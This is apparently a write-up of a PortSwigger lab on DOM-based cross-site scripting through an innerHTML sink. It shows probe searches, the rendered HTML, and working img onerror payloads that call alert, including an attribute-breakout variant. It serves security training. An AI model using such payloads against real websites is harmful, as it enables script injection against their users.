# DOM XSS in `innerHTML` sink using source

## This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

## To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

### Note: The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`

### step1

search test on search box

`<h1><span>3 search results for '</span><span id="searchMessage">test</span><span>'</span></h1>

search "test
`<h1><span>3 search results for '</span><span id="searchMessage">"test</span><span>'</span></h1>

### step2

search
`<img src=1 onerror=alert(document.domain)>`

`<h1><span>0 search results for '</span><span id="searchMessage"><img src="1" onerror="alert(document.domain)"></span><span>'</span></h1>`
pop up will come

now
`"><img src=1 onerror=alert(document.domain)>`
